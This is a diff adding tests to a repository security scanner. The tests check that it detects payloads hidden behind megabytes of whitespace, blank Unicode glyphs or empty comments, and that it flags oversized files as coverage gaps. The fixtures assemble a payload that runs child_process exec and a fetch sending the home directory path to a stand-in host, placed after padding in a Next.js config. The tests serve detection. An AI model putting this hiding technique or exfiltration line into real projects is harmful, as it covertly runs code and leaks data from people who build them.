@@ -13,7 +13,7 @@ import { Findings } from '../sandbox/scanner/findings.js'
 import { gitChecks, linkResolver } from '../sandbox/scanner/clone.js'
 import { dependencyChecks } from '../sandbox/scanner/checks/deps.js'
 import { autorunChecks } from '../sandbox/scanner/checks/autorun.js'
-import { contentChecks } from '../sandbox/scanner/checks/content.js'
+import { contentChecks, longestHiddenGap, MAX_CODE_FILE_BYTES } from '../sandbox/scanner/checks/content.js'
 import { foldPath } from '../sandbox/scanner/paths.js'
 import { fixture, j } from './helpers/fixture.js'
 import { fakeOsv } from './helpers/fake-osv.js'
@@ -336,4 +336,52 @@ test('[audit 2] the resolver agrees with the operating system on random link tre
     } finally { await rm(root, { recursive: true, force: true }) }
   }
   assert.equal(checked, 750)
+})
+
+// --- 6: hidden-whitespace payloads past the read limit, behind blank glyphs, or in long empty comments
+
+const BLANK = cp => String.fromCharCode(cp) // built at runtime, so this file holds no raw blank glyphs
+const PAYLOAD = `${j('requ', 'ire')}("${j('child_', 'process')}").${j('ex', 'ec')}("id")`
+
+test('[audit 6] a payload after 2 MiB of spaces in a build config is still found (code is read up to 16 MiB)', async () => {
+  const tail = `${PAYLOAD};${j('fet', 'ch')}("https://x.invalid/" + require("os").homedir())`
+  const r = await content({ 'next.config.js': `module.exports = { reactStrictMode: true };${' '.repeat(2 * 1024 * 1024)}${tail}\n` })
+  assert.ok(r.some(f => f.id === 'HIDDEN-WHITESPACE-PAYLOAD' && f.severity === 'high' && f.file === 'next.config.js'), ids(r))
+  assert.ok(r.some(f => f.id === 'CONFIG-EXEC' && f.file === 'next.config.js'), ids(r))
+})
+
+test('[audit 6] a code file still cut off at 16 MiB is a coverage gap; a big data file is not', async () => {
+  const r = await content({ 'lib/big.js': `// x\n${'a'.repeat(MAX_CODE_FILE_BYTES + 10)}\n`, 'data/big.csv': 'b'.repeat(3 * 1024 * 1024) })
+  assert.ok(r.some(f => f.id === 'SCAN-LARGE-CODE-FILE' && f.severity === 'medium' && f.file === 'lib/big.js'), ids(r))
+  assert.ok(!r.some(f => f.id === 'SCAN-LARGE-CODE-FILE' && f.file === 'data/big.csv'), ids(r))
+  assert.ok(r.some(f => f.id === 'SCAN-LARGE-FILES' && f.severity === 'info'), ids(r))
+})
+
+test('[audit 6] blank-looking glyphs and long empty comments count as hidden gap (f5 braille)', async () => {
+  for (const cp of [0x2800, 0x3164, 0xffa0, 0x115f, 0x1160, 0x200b]) {
+    assert.ok(longestHiddenGap(`const x = 1;${BLANK(cp).repeat(300)}${PAYLOAD}`).len >= 300, cp.toString(16))
+  }
+  assert.ok(longestHiddenGap(`const x = 1;/*${BLANK(0x2800).repeat(300)}*/${PAYLOAD}`).len >= 300)
+  assert.ok(longestHiddenGap(`const x = 1;/*${' '.repeat(300)}*/${PAYLOAD}`).len >= 300)
+  assert.ok(longestHiddenGap(`const x = 1;${'/**/'.repeat(100)}${PAYLOAD}`).len >= 300)
+  const r = await content({ 'b.js': `const x = 1;/*${BLANK(0x2800).repeat(300)}*/${PAYLOAD}\n` })
+  assert.ok(r.some(f => f.id === 'HIDDEN-WHITESPACE-PAYLOAD' && f.severity === 'high'), ids(r))
+  // A comment with words in it is not a gap, and neither is indentation before the first character.
+  assert.ok(longestHiddenGap(`x = 1;  /* see the README for why this is ${' '.repeat(10)}here */ y()`).len < 150)
+  assert.ok(longestHiddenGap(`${BLANK(0x2800).repeat(400)}x()`).len < 150)
+})
+
+test('[audit 6] the gap scan stays linear on hostile 16 MiB lines', () => {
+  for (const line of [' '.repeat(16 * 1024 * 1024), `/*${' '.repeat(16 * 1024 * 1024)}`, `/*${' '.repeat(100)}`.repeat(160000), BLANK(0x2800).repeat(16 * 1024 * 1024)]) {
+    const t = Date.now()
+    longestHiddenGap(line)
+    assert.ok(Date.now() - t < 4000, `took ${Date.now() - t} ms`)
+  }
+})
+
+test('[audit 6] padding package.json or the lockfile past the read limit is a coverage gap, not "no scripts"', async () => {
+  const padded = `{"scripts":{"postinstall":"node x.js"}${' '.repeat(16 * 1024 * 1024)}}`
+  const r = await deps({ 'package.json': padded, '.npmrc': `# ${'x'.repeat(16 * 1024 * 1024)}\n` })
+  assert.ok(r.some(f => f.id === 'SCAN-LARGE-CODE-FILE' && f.file === 'package.json' && f.severity === 'medium'), ids(r))
+  assert.ok(r.some(f => f.id === 'SCAN-LARGE-CODE-FILE' && f.file === '.npmrc'), ids(r))
 })
